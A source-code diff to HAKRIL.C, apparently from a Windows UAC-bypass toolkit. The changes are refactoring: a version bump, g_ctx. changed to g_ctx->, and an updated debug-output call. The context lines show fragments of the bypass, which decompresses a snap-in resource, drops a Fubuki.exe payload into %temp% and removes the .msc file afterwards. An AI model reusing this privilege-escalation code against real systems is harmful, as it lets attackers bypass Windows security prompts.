@@ -4,9 +4,9 @@
 *
 *  TITLE:       HAKRIL.C
 *
-*  VERSION:     3.10
+*  VERSION:     3.11
 *
-*  DATE:        18 Nov 2018
+*  DATE:        23 Nov 2018
 *
 *  UAC bypass method from Clement Rouault aka hakril.
 *
@@ -112,7 +112,7 @@ BOOL ucmHakrilMethod(
     ULONG DataSize = 0, SnapinSize = 0, ErrorCode = 0;
     SIZE_T Dummy;
     PVOID SnapinResource = NULL, SnapinData = NULL;
-    PVOID ImageBaseAddress = NtCurrentPeb()->ImageBaseAddress;
+    PVOID ImageBaseAddress = g_hInstance;
     PVOID LaunchAdminProcessPtr = NULL;
     LPWSTR lpText;
 
@@ -145,7 +145,7 @@ BOOL ucmHakrilMethod(
                 break;
             }
 
-            ucmShowMessage(lpText);
+            ucmShowMessage(g_ctx->OutputToDebugger, lpText);
             break;
         }
 
@@ -158,7 +158,7 @@ BOOL ucmHakrilMethod(
             &DataSize);
 
         if (SnapinResource) {
-            SnapinData = g_ctx.DecompressRoutine(KAMIKAZE_ID, SnapinResource, DataSize, &SnapinSize);
+            SnapinData = g_ctx->DecompressRoutine(KAMIKAZE_ID, SnapinResource, DataSize, &SnapinSize);
             if (SnapinData == NULL)
                 break;
         }
@@ -177,7 +177,7 @@ BOOL ucmHakrilMethod(
         // Write Fubuki.exe to the %temp%
         //
         RtlSecureZeroMemory(&szBuffer, sizeof(szBuffer));
-        _strcpy(szBuffer, g_ctx.szTempDirectory);
+        _strcpy(szBuffer, g_ctx->szTempDirectory);
         Dummy = _strlen(szBuffer);
         _strcat(szBuffer, FUBUKI_EXE);
 
@@ -270,7 +270,7 @@ BOOL ucmHakrilMethod(
     // Remove our msc file. Fubuki should be removed by payload code itself as it will be locked on execution.
     //
     if (bExtracted) {
-        _strcpy(szBuffer, g_ctx.szTempDirectory);
+        _strcpy(szBuffer, g_ctx->szTempDirectory);
         _strcat(szBuffer, KAMIKAZE_MSC);
         DeleteFile(szBuffer);
     }
